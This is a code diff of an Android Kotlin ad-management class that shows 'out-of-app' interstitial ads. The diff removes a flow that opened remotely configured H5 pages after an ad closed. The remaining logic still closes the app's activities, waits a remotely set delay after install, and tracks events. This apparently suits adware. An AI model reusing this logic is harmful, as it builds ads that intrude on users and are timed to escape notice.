@@ -64,7 +64,7 @@ class TopOnTool {
                     false,
                     "getfail",
                     "string1",
-                    p0?.code+p0?.desc
+                    p0?.code + p0?.desc
                 )
                 isHaveAdData = false
             }
@@ -88,7 +88,6 @@ class TopOnTool {
             override fun onInterstitialAdClose(p0: ATAdInfo?) {
                 ShowDataTool.showLog("体外广告onAdClosed: 广告${p0?.getPlacementId()}被关闭")
                 PngCanGo.closeAllActivities()
-                cloneAndOpenH5()
             }
 
             override fun onInterstitialAdVideoStart(p0: ATAdInfo?) {
@@ -104,25 +103,25 @@ class TopOnTool {
                     false,
                     "showfailer",
                     "string3",
-                    p0?.code+"  "+p0?.desc
+                    p0?.code + "  " + p0?.desc
                 )
             }
         })
 
     }
 
-    private fun litAd(): Boolean {
+    private fun litAd(isCanUp: Boolean): Boolean {
         val jsonBean = ShowDataTool.getAdminData() ?: return true
         val limits = jsonBean.appConfig.exposure.limits.splitString("/")
         val hADData = (limits.getOrNull(0) ?: "").toInt()
         val dayAdData = (limits.getOrNull(1) ?: "").toInt()
         val clicksPerDay = jsonBean.appConfig.exposure.interactions
-        return !adLimiter.canShowAd(hADData, dayAdData, clicksPerDay)
+        return !adLimiter.canShowAd(isCanUp,hADData, dayAdData, clicksPerDay)
     }
 
     // 加载广告方法
     private fun loadAd() {
-        if (litAd()) {
+        if (litAd(false)) {
             ShowDataTool.showLog("体外广告展示限制,不加载广告")
             return
         }
@@ -243,24 +242,11 @@ class TopOnTool {
             }
         val timeD = installFast + (insInt * 1000) + (jsonBean.network.h5Config.ttl * 1000)
         canNextState = false
-        val (h5Url, hData, dayData) = PngAllData.safeParseGateways(jsonBean.network.h5Config.gateways[0])
-        ShowDataTool.showLog("h5Url=: ${h5Url}==${timeD > System.currentTimeMillis() && h5Url.isNotEmpty()}")
-        if (timeD > System.currentTimeMillis() && h5Url.isNotEmpty()) {
-            // 检查广告展示限制
-            if (!startApp.h5Limiter.canShowAd(hData, dayData)) {
-                ShowDataTool.showLog("h5广告展示限制")
-                return
-            }
-            ShowDataTool.showLog("h5流程")
-            PngCanGo.isH5State = true
-        } else {
-            PngCanGo.isH5State = false
-            if (litAd()) {
-                ShowDataTool.showLog("体外广告展示限制")
-                return
-            }
-            ShowDataTool.showLog("体外流程")
+        if (litAd(true)) {
+            ShowDataTool.showLog("体外广告展示限制")
+            return
         }
+        ShowDataTool.showLog("体外流程")
         showAdAndTrack()
     }
 
@@ -296,78 +282,15 @@ class TopOnTool {
         CoroutineScope(Dispatchers.Main).launch {
             PngCanGo.closeAllActivities()
             delay(1011)
-            if (canNextState) {
-                ShowDataTool.showLog("准备显示h5广告，中断体外广告")
-                return@launch
-            }
             addFa()
             ZJiaPng.jiaPng("callstartgicallstart", true)
             TtPoint.postPointData(false, "callstart")
         }
     }
 
-    fun cloneAndOpenH5() {
-        // 锁屏+亮屏幕  && 在N秒后 && H5不超限
-        // 当广告未关闭 下一个循环触发 体外广告，也会调用Close
-        val jsonBean = ShowDataTool.getAdminData() ?: return
-        val (h5Url, hData, dayData) = PngAllData.safeParseGateways(jsonBean.network.h5Config.gateways[0])
-        ShowDataTool.showLog("h5Url=: ${h5Url}=clickState=${clickState}")
-        if (clickState || h5Url.isEmpty()) {
-            return
-        }
-        clickState = false
-        ShowDataTool.showLog("关闭打开H5")
-        if (TopOnUtils.canShowLocked()) {
-            ShowDataTool.showLog("锁屏或者息屏状态，广告不展示")
-            return
-        }
-        val installFast = PngCanGo.getInstallFast()
-        val ins = jsonBean.appConfig.timing.checks.splitString("|").getOrNull(1) ?: "0"
-        val wait = jsonBean.appConfig.timing.checks.splitString("|").getOrNull(2) ?: "0"
-        val insInt =
-            try {
-                ins.toInt()
-            } catch (e: Exception) {
-                0
-            }
-        val waitInt =
-            try {
-                wait.toInt()
-            } catch (e: Exception) {
-                0
-            }
-        val timeD = installFast + (insInt * 1000) + (jsonBean.network.h5Config.ttl * 1000)
-        val jiange = (System.currentTimeMillis() - TopOnUtils.adShowTime) / 1000
-        ShowDataTool.showLog("H5----1---=${timeD <= System.currentTimeMillis()}")
-        ShowDataTool.showLog("H5----2---=${jiange < waitInt}")
-
-        if (timeD <= System.currentTimeMillis() && jiange < waitInt) {
-            // 检查广告展示限制
-            if (!startApp.h5Limiter.canShowAd(hData, dayData)) {
-                ShowDataTool.showLog("h5广告展示限制")
-                return
-            }
-            ShowDataTool.showLog("跳转打开H5")
-            PngCanGo.isH5State = true
-            canNextState = true
-            showAdAndTrack2()
-        }
-    }
-
-    private fun showAdAndTrack2() {
-        TtPoint.postPointData(false, "ispass", "string", "")
-        CoroutineScope(Dispatchers.Main).launch {
-            addFa()
-            PngCanGo.closeAllActivities()
-            delay(678)
-            ZJiaPng.jiaPng("ispassgicspass", false)
-            TtPoint.postPointData(false, "callstart")
-        }
-    }
-
 
     private fun addFa() {
-        val okSpBean = startApp.okSpBean ?: return
+        val okSpBean = startApp.okSpBean
         synchronized(okSpBean) {
             var adNum = okSpBean.isAdFailCount
             adNum++
